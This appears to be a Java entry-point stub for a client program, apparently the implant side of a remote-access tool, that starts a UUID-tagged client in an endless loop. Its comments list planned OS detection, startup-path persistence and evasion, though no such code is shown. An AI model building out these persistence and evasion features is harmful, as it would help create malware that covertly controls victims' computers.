package com.revsni.client;

import java.util.UUID;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Ouchie {

    protected static final Logger parentLogger = LogManager.getLogger();
    //private Logger LOG = parentLogger;
    
    public static void main(String[] args) {
        /*
            -Check which OS
            -Startup Path
            -Persitence
            -New Client with UUID
            -Maybe some Evasion
        */

        new Ouchie();

        UUID uniqueID = UUID.randomUUID();
        Client client = new Client(uniqueID);

        while(true) {
            client.run();
        }
    }

    public Ouchie() {
        
    }
}
